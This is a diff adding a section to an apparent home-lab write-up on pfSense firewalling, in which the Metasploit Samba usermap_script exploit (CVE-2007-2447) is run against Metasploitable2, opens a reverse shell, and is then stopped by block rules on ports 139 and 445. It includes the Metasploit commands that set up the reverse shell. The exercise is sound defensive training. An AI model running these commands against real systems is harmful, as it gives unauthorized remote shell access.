@@ -167,6 +167,63 @@ environment these logs feed into a SIEM for alerting and analysis.
 
 ---
 
+## Part E — Block Rule: Ports 139 & 445 (Samba)
+
+The Samba Usermap Script exploit (CVE-2007-2447) from Exercise 04 was 
+re-run against Metasploitable2 through pfSense to verify connectivity, 
+then blocked using firewall rules.
+
+**Baseline — exploit working through firewall:**
+```bash
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.1.100
+set LHOST 192.168.56.102
+run
+```
+
+**Result:** Reverse TCP shell opened from `192.168.56.102:4444` to 
+`192.168.1.100:41773` — traffic passed through pfSense.
+
+### Screenshot — Samba Exploit Successful Through Firewall
+![Samba Exploit Working](../screenshots/1_samba_exploit_working.png)
+
+Two block rules were added in pfSense at **Firewall → Rules → WAN**:
+
+| Field | Rule 1 | Rule 2 |
+|---|---|---|
+| Action | Block | Block |
+| Protocol | TCP | TCP |
+| Destination Port | 139 (NetBIOS-SSN) | 445 (MS-DS) |
+| Logging | Enabled | Enabled |
+| Description | Block Samba port 139 | Block Samba port 445 |
+
+### Screenshot — pfSense Rules: All Block Rules Active
+![pfSense Rules](../screenshots/2_pfsense_rules_added.png)
+
+The exploit was run again with both block rules active:
+
+**Result:**
+```
+[-] 192.168.1.100:139 - Exploit failed [unreachable]: 
+Rex::ConnectionTimeout The connection with (192.168.1.100:139) timed out.
+```
+
+### Screenshot — Samba Exploit Blocked
+![Samba Exploit Blocked](../screenshots/3_samba_exploit_blocked.png)
+
+**Firewall log evidence** — repeated block entries from 
+`192.168.56.102` to `192.168.1.100:139` confirming the rule triggered:
+
+### Screenshot — Firewall Logs: Samba Traffic Blocked
+![Firewall Logs Samba](../screenshots/4_blocked_samba_firewall_logs.png)
+
+**Note on port 139 vs 445** — the Samba exploit targets port 139 
+(NetBIOS) which pfSense blocked before the connection attempt reached 
+port 445. Both ports are blocked as Samba uses either depending on 
+the client negotiation.
+
+---
+
 ## Real-World Relevance
 This exercise mirrors a fundamental blue team task — implementing 
 network segmentation and firewall rules to limit an attacker's 
